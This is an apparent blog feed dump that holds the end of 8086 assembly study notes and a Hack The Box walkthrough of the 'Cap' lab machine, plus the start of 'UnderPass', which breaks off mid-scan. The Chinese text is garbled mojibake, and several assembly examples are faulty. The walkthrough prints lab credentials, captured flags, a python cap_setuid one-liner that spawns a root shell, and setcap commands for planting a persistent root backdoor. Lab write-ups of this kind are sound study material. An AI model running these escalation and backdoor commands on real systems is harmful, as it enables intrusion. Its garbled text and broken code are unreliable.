èŠ¯ç‰‡</h3><ul><li>åŒ…å«ä¸€ä¸ªå®æ—¶é’Ÿå’Œä¸€ä¸ªæœ‰ 128 ä¸ªå­˜å‚¨å•å…ƒçš„ RAM å­˜å‚¨å™¨</li><li>128 ä¸ªå­—èŠ‚çš„ RAM ä¸­ï¼Œå†…éƒ¨å®æ—¶é’Ÿå ç”¨ 0~0dh å•å…ƒæ¥ä¿å­˜æ—¶é—´ä¿¡æ¯ï¼Œå…¶ä½™å¤§éƒ¨åˆ†å•å…ƒç”¨äºä¿å­˜ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼Œä¾›ç³»ç»Ÿå¯åŠ¨æ—¶ BIOS ç¨‹åºè¯»å–</li><li>èŠ¯ç‰‡å†…éƒ¨æœ‰ä¸¤ä¸ªç«¯å£ï¼Œå­˜æ”¾è¦è®¿é—®çš„ CMOS RAM å•å…ƒçš„åœ°å€ï¼›71h ä¸ºæ•°æ®ç«¯å£ï¼Œå­˜æ”¾ä»é€‰å®šçš„ CMOS RAM å•å…ƒä¸­è¯»å–çš„æ•°æ®ï¼Œæˆ–è¦å†™å…¥åˆ°å…¶ä¸­çš„æ•°æ®ã€‚CPU å¯¹ CMOS RAM çš„è¯»å†™åˆ†ä¸¤æ­¥è¿›è¡Œï¼Œè¯» CMOS RAM çš„ 2 å·å•å…ƒ<ul><li>å°† 2 é€å…¥ç«¯å£ 70h</li><li>ä»ç«¯å£ 70h è¯»å‡º 2 å·å•å…ƒçš„å†…å®¹</li></ul></li></ul><h3 id="14-3-shl-å’Œ-shr-æŒ‡ä»¤"><a href="#14-3-shl-å’Œ-shr-æŒ‡ä»¤" class="headerlink" title="14.3 shl å’Œ shr æŒ‡ä»¤"></a>14.3 shl å’Œ shr æŒ‡ä»¤</h3><p>shl æ˜¯é€»è¾‘å·¦ç§»æŒ‡ä»¤</p><ul><li>å°†ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜å•å…ƒä¸­çš„æ•°æ®å‘å·¦ç§»ä½</li><li>å°†æœ€åç§»å‡ºçš„ä¸€ä½å†™å…¥ CF ä¸­</li><li>æœ€ä½ä½ç”¨ 0 è¡¥å……</li></ul><p>æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01001000b<br>shl al,1//å·¦ç§» 1 ä½<br>//(al)=10010000b<br></code></pre></td></tr></table></figure><p><strong>å¦‚æœç§»åŠ¨ä½æ•°å¤§äº 1 æ—¶ï¼Œå¿…é¡»å°†ç§»åŠ¨ä½æ•°æ”¾åœ¨ cl ä¸­</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01010001b<br>mov cl,3<br>shl,al,cl<br>//æ‰§è¡Œå (al)=10001000b,æœ€åç§»å‡ºçš„ä¸€ä½æ˜¯ 0,æ‰€ä»¥ CF=0<br></code></pre></td></tr></table></figure><p>shr æ˜¯é€»è¾‘å³ç§»æŒ‡ä»¤</p><ul><li>å‘å³ç§»ä½</li><li>æœ€åç§»å‡ºçš„ä¸€ä½å†™å…¥ CF ä¸­</li><li>æœ€é«˜ä½ç”¨ 0 è¡¥å……</li></ul><p>æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,10000001b<br>shr al,1//å³ç§»<br>//(al)=01000000b,CF =1<br></code></pre></td></tr></table></figure><p>e.g ç”¨åŠ æ³•å’Œç§»ä½æŒ‡ä»¤è®¡ç®— (ax)&#x3D;(ax)*10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>start:mov bx,ax<br>shl,ax,1<br>mov cl,3<br>shl bx,cl//å·¦ç§» 3 ä½,(bx)=(ax)*8<br>add ax,bx//(ax)=(ax)*2+(ax)*8<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br><br></code></pre></td></tr></table></figure><h1 id="åäº”ã€å¤–ä¸­æ–­"><a href="#åäº”ã€å¤–ä¸­æ–­" class="headerlink" title="åäº”ã€å¤–ä¸­æ–­"></a>åäº”ã€å¤–ä¸­æ–­</h1><h3 id="15-2-å¤–ä¸­æ–­ä¿¡æ¯"><a href="#15-2-å¤–ä¸­æ–­ä¿¡æ¯" class="headerlink" title="15.2 å¤–ä¸­æ–­ä¿¡æ¯"></a>15.2 å¤–ä¸­æ–­ä¿¡æ¯</h3><p>1ï¼‰å¯å±è”½ä¸­æ–­</p><p>CPU å¯ä»¥ä¸å“åº”çš„å¤–ä¸­æ–­ï¼Œå¦‚æœ IF &#x3D; 0ï¼ŒCPU å¯ä»¥ä¸å“åº”å¯å±è”½ä¸­æ–­</p><p>sti ,è®¾ç½® IF &#x3D;1</p><p>cli ,è®¾ç½® IF &#x3D;0</p><p><strong>å‡ ä¹æ‰€æœ‰ç”±å¤–è®¾å¼•å‘çš„ä¸­æ–­éƒ½æ˜¯å¯å±è”½ä¸­æ–­</strong></p><p>2ï¼‰ä¸å¯å±è”½ä¸­æ–­</p><p>å¯¹äº 8086CPU ï¼Œä¸å¯å±è”½ä¸­æ–­ç±»å‹ç å›ºå®šä¸º2ï¼Œæ‰€ä»¥ä¸­æ–­è¿‡ç¨‹ä¸­ï¼Œä¸éœ€è¦å–ä¸­æ–­ç±»å‹ç ï¼Œè¿‡ç¨‹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ ‡å¿—å¯„å­˜å™¨å…¥,IF=0,TF=0<br>CSã€IP å…¥æ ˆ<br>(IP)=(8),(CS)=(0AH0)<br></code></pre></td></tr></table></figure><h1 id="æŒ‡ä»¤ç³»ç»Ÿæ€»ç»“"><a href="#æŒ‡ä»¤ç³»ç»Ÿæ€»ç»“" class="headerlink" title="æŒ‡ä»¤ç³»ç»Ÿæ€»ç»“"></a>æŒ‡ä»¤ç³»ç»Ÿæ€»ç»“</h1><h3 id="1-æ•°æ®ä¼ é€æŒ‡ä»¤"><a href="#1-æ•°æ®ä¼ é€æŒ‡ä»¤" class="headerlink" title="1. æ•°æ®ä¼ é€æŒ‡ä»¤"></a>1. æ•°æ®ä¼ é€æŒ‡ä»¤</h3><p>mov ã€sub ã€pushã€popã€pushfã€popfã€xchgç­‰éƒ½æ˜¯æ•°æ®ä¼ é€æŒ‡ä»¤ï¼Œå®ç°å¯„å­˜å™¨å’Œå†…å­˜ã€å¯„å­˜å™¨å’Œå¯„å­˜å™¨ä¹‹é—´çš„å•ä¸ªæ•°æ®ä¼ é€</p><h3 id="2-ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#2-ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="2. ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>2. ç®—æœ¯è¿ç®—æŒ‡ä»¤</h3><p>addã€subã€adcã€sbbã€incã€decã€cmpã€imulã€idivã€aaaç­‰ï¼Œå®ç°å¯„å­˜å™¨å’Œå†…å­˜ä¸­çš„æ•°æ®çš„ç®—æ•°è¿ç®—ï¼Œæ‰§è¡Œç»“æœå½±å“å¯„å­˜å™¨çš„ sfã€zfã€ofã€cfã€pfã€afä½</p><h3 id="3-é€»è¾‘æŒ‡ä»¤"><a href="#3-é€»è¾‘æŒ‡ä»¤" class="headerlink" title="3. é€»è¾‘æŒ‡ä»¤"></a>3. é€»è¾‘æŒ‡ä»¤</h3><p>addã€orã€notã€xorã€testã€shlã€shrã€salã€sarã€rolã€rorã€rclã€rcrç­‰ï¼Œé™¤äº† not å¤–ï¼Œæ‰§è¡Œç»“æœéƒ½å½±å“æ ‡å¿—å¯„å­˜å™¨çš„ç›¸å…³æ ‡å¿—ä½</p><h3 id="4-è½¬ç§»æŒ‡ä»¤"><a href="#4-è½¬ç§»æŒ‡ä»¤" class="headerlink" title="4. è½¬ç§»æŒ‡ä»¤"></a>4. è½¬ç§»æŒ‡ä»¤</h3><p>å¯ä»¥ä¿®æ”¹ IP ï¼Œæˆ–è€…åŒæ—¶ä¿®æ”¹ CS å’Œ IP</p><p>1ï¼‰æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼Œjmp</p><p>2ï¼‰æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼Œjcxzï¼Œjeï¼Œjbï¼Œjaï¼Œjnbï¼Œjnaç­‰</p><p>3ï¼‰å¾ªç¯æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼Œloop</p><p>4ï¼‰è¿‡ç¨‹ï¼Œæ¯”å¦‚ï¼Œcallã€retã€retf</p><p>5ï¼‰ä¸­æ–­ï¼Œæ¯”å¦‚ï¼Œintã€iret</p><h3 id="5-å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"><a href="#5-å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤" class="headerlink" title="5. å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"></a>5. å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤</h3><p>cldã€stdã€cliã€stiã€nopã€clcã€cmcã€stcã€hltã€waitã€escã€lockç­‰</p><h3 id="6-ä¸²å¤„ç†æŒ‡ä»¤"><a href="#6-ä¸²å¤„ç†æŒ‡ä»¤" class="headerlink" title="6. ä¸²å¤„ç†æŒ‡ä»¤"></a>6. ä¸²å¤„ç†æŒ‡ä»¤</h3><p>movsbã€movswã€cmpsã€scasã€lodsã€stosç­‰ï¼Œå¯æ­é… repã€repeã€repneç­‰ä½¿ç”¨</p><h1 id="åå…­ã€ç›´æ¥å®šå€è¡¨"><a href="#åå…­ã€ç›´æ¥å®šå€è¡¨" class="headerlink" title="åå…­ã€ç›´æ¥å®šå€è¡¨"></a>åå…­ã€ç›´æ¥å®šå€è¡¨</h1><h3 id="16-2-åœ¨å…¶ä»–æ®µä¸­ä½¿ç”¨æ•°æ®æ ‡å·"><a href="#16-2-åœ¨å…¶ä»–æ®µä¸­ä½¿ç”¨æ•°æ®æ ‡å·" class="headerlink" title="16.2 åœ¨å…¶ä»–æ®µä¸­ä½¿ç”¨æ•°æ®æ ‡å·"></a>16.2 åœ¨å…¶ä»–æ®µä¸­ä½¿ç”¨æ•°æ®æ ‡å·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dd a,b<br>data ends<br></code></pre></td></tr></table></figure><p>æ ‡å· c å¤„å­˜å‚¨çš„ä¸¤ä¸ªåŒå­—èŠ‚å‹æ•°æ®ä¸ºæ ‡å· a çš„åç§»åœ°å€å’Œæ®µåœ°å€ã€æ ‡å· b çš„åç§»åœ°å€å’Œæ®µåœ°å€ ,ç›¸å½“äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br>a db 1,2,3,4,5,6,7,8<br>b dw 0<br>c dw offset a,seg a,offset b,seg b<br>data ends<br>//seg æ“ä½œç¬¦ï¼ŒåŠŸèƒ½ä¸ºå–å¾—æŸä¸€æ ‡å·çš„æ®µåœ°å€<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åªå…³äº Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Cap &amp; UnderPass</title>
    <link href="/2025/03/12/HTB-Cap-UnderPass/"/>
    <url>/2025/03/12/HTB-Cap-UnderPass/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/HTB/Machine/Cap]<br>â””â”€# nmap -p- -T4 --min-rate=<span class="hljs-number">1000</span> -sS -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">11</span> <span class="hljs-number">14</span>:<span class="hljs-number">39</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">30</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">86</span>.<span class="hljs-number">05</span> seconds<br></code></pre></td></tr></table></figure><p>å¼€ç€ 21ã€22ã€80</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:3<br></code></pre></td></tr></table></figure><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p>è®¿é—® 80 ç«¯å£ï¼Œä¾§è¾¹æ æ‰¾åˆ° <code>Security Snapshot</code> ï¼ŒæŸ¥çœ‹ url</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After running <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;Security Snapshot&quot;</span>, <span class="hljs-keyword">the</span> browser is redirected <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> path <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">format</span> /[something]/[id], where [id] represents <span class="hljs-keyword">the</span> id <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> scan. What is <span class="hljs-keyword">the</span> [something]?<br>:data<br></code></pre></td></tr></table></figure><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p>æŸ¥çœ‹ä¾§è¾¹æ çš„ <code>Network Status</code> å‘ç°è¿˜æœ‰å…¶ä»– IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/a8fafe0bc546ec32.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Are you able <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">to</span> other users<span class="hljs-string">&#x27; scans?</span><br><span class="hljs-string">:yes</span><br></code></pre></td></tr></table></figure><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> PCAP <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> sensative data?<br>:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><p>åœ¨ <code>http://10.10.10.245/data/0</code> ä¸‹è½½æ•°æ®åŒ…</p><p><img src="https://img.dkdun.cn/v1/2025/12/8f2ffd0671c11359.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which application layer protocol <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> pcap <span class="hljs-built_in">file</span> can <span class="hljs-keyword">the</span> sensetive data be found <span class="hljs-keyword">in</span>?<br>:<span class="hljs-keyword">ftp</span><br></code></pre></td></tr></table></figure><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nathan</span><br>PASS Buck3tH4TF0RM3!<br></code></pre></td></tr></table></figure><p>ssh ä¹Ÿèƒ½ç”¨</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">W<span class="hljs-string">e&#x27;ve managed to collect nathan&#x27;</span>s FTP <span class="hljs-keyword">password</span>. <span class="hljs-keyword">On</span> what other service does this <span class="hljs-keyword">password</span> <span class="hljs-keyword">work</span>?<br>:ssh<br></code></pre></td></tr></table></figure><h2 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ftp <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">245</span><br>get user.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/752db83161eb57c2.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the nathan user&#x27;s home directory.<br>:<span class="hljs-number">12298311</span>c<span class="hljs-number">4131</span>1a3b59b<span class="hljs-number">4887</span>9e6c07ff<br></code></pre></td></tr></table></figure><h2 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h2><p>ä¼ ä¸€ä¸ª <code>linpeas.sh</code> ä¸Šå»ï¼Œåœ¨ <code>Capabilities</code> ä¸‹çœ‹åˆ°äº† <code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/957af3fac15cccef.png"></p><p>è¿˜å¯ä»¥ç›´æ¥æŸ¥æ‰¾</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getcap -r / <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">full</span> <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the binary <span class="hljs-keyword">on</span> this machine has special capabilities that can be abused <span class="hljs-keyword">to</span> obtain root <span class="hljs-keyword">privileges</span>?<br>:/usr/bin/python3<span class="hljs-number">.8</span><br></code></pre></td></tr></table></figure><h2 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h2><p>æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3<span class="hljs-number">.8</span> -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ root æƒé™</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:<span class="hljs-number">07860203</span>4d5abb<span class="hljs-number">9587</span>c86b9f<span class="hljs-number">7560</span>ab18<br></code></pre></td></tr></table></figure><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p><p>å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶å…·æœ‰ Linux <code>CAP_SETUID</code> åŠŸèƒ½é›†æˆ–è€…å…·æœ‰åŠŸèƒ½é›†çš„å¦ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œï¼Œå¯ä»¥ç”¨ä½œåé—¨ï¼Œé€šè¿‡æ“ä½œè‡ªå·±çš„è¿›ç¨‹ UID æ¥ç»´æŒæƒé™è®¿é—®</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cp $(which python) .<br>sudo setcap cap_setuid+ep python<br><br>./python -c &#x27;import os; os.setuid(<span class="hljs-number">0</span>); os.system(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure><p><code>Capabilities</code> æœºåˆ¶åœ¨ Linux å†…æ ¸ 2.2 ä¹‹åå¼•å…¥ï¼Œå®ƒå°† root ç”¨æˆ·æƒé™ç»†åˆ†ä¸ºä¸åŒé¢†åŸŸï¼Œå¯ä»¥ç¦ç”¨æˆ–å¯ç”¨ã€‚å¦‚æœ euid ä¸æ˜¯ root ï¼Œé‚£ä¹ˆä¼šæ£€æŸ¥æ˜¯å¦å…·æœ‰ç‰¹æƒæ“ä½œæ‰€å¯¹åº”çš„ <code>Capabilities</code>ï¼Œä»¥æ­¤ä¸ºä¾æ®æ¥å†³å®šæ˜¯å¦èƒ½æ‰§è¡Œæƒé™æ“ä½œï¼Œä¸»è¦æ˜¯é’ˆå¯¹ SUID çš„æƒé™æ§åˆ¶</p><p>ä¸Šè¿°çš„ <code>CAP_SETUID</code> å°±æ˜¯æ”¹å˜è¿›ç¨‹çš„ uid(setuid(),setreuid(),setresuid() ç­‰ç­‰) å¯¹åº”çš„ capability </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ›´å¤šè¯¦æƒ…å¯ä»¥çœ‹å¤§ä½¬ä»¬çš„åšå®¢ï¼š<a href="https://www.cnblogs.com/f-carey/p/16026088.html%EF%BC%8Chttps://rk700.github.io/2016/10/26/linux-capabilities/">https://www.cnblogs.com/f-carey/p/16026088.htmlï¼Œhttps://rk700.github.io/2016/10/26/linux-capabilities/</a></p><h1 id="UnderPass"><a href="#UnderPass" class="headerlink" title="UnderPass"></a>UnderPass</h1><h2 id="Submit-User-Flag-1"><a href="#Submit-User-Flag-1" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# nmap -sS -sV -Pn -A <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">33</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br>| ssh-hostkey:<br>|   <span class="hljs-number">256</span> <span class="hljs-number">48</span>:b0:d2:c7:<span class="hljs-number">29</span>:<span class="hljs-number">26</span>:ae:<span class="hljs-number">3</span>d:fb:b7:<span class="hljs-number">6</span>b:<span class="hljs-number">0</span>f:f5:<span class="hljs-number">4</span>d:<span class="hljs-number">2</span>a:ea (ECDSA)<br>|_  <span class="hljs-number">256</span> cb:<span class="hljs-number">61</span>:<span class="hljs-number">64</span>:b8:<span class="hljs-number">1</span>b:<span class="hljs-number">1</span>b:b5:ba:b8:<span class="hljs-number">45</span>:<span class="hljs-number">86</span>:c5:<span class="hljs-number">16</span>:bb:e2:a2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">52</span> (Ubuntu)<br>|_http-<span class="hljs-built_in">title</span>: Apache2 Ubuntu Default Page: It works<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><span class="hljs-function">OS:<span class="hljs-title">SCAN</span>(<span class="hljs-title">V</span>=7.94<span class="hljs-title">SVN</span>%<span class="hljs-title">E</span>=4%<span class="hljs-title">D</span>=3/12%<span class="hljs-title">OT</span>=22%<span class="hljs-title">CT</span>=1%<span class="hljs-title">CU</span>=41673%<span class="hljs-title">PV</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DS</span>=3%<span class="hljs-title">DC</span>=<span class="hljs-title">T</span>%<span class="hljs-title">G</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">TM</span>=67<span class="hljs-title">D1</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:50<span class="hljs-title">C6</span>%<span class="hljs-title">P</span>=<span class="hljs-title">x86_64</span>-<span class="hljs-title">pc</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>)<span class="hljs-title">SEQ</span>(<span class="hljs-title">SP</span>=<span class="hljs-title">FF</span>%<span class="hljs-title">GCD</span>=1%<span class="hljs-title">ISR</span>=106%<span class="hljs-title">TI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">CI</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">II</span>=<span class="hljs-title">I</span>%<span class="hljs-title">TS</span>=<span class="hljs-title">A</span>)<span class="hljs-title">O</span></span><br><span class="hljs-function"><span class="hljs-title">OS:PS</span>(<span class="hljs-title">O1</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O2</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O3</span>=<span class="hljs-title">M53ANNT11NW7</span>%<span class="hljs-title">O4</span>=<span class="hljs-title">M53AST11NW7</span>%<span class="hljs-title">O5</span>=<span class="hljs-title">M53AS</span></span><br><span class="hljs-function"><span class="hljs-title">OS:T11NW7</span>%<span class="hljs-title">O6</span>=<span class="hljs-title">M53AST11</span>)<span class="hljs-title">WIN</span>(<span class="hljs-title">W1</span>=<span class="hljs-title">FE88</span>%<span 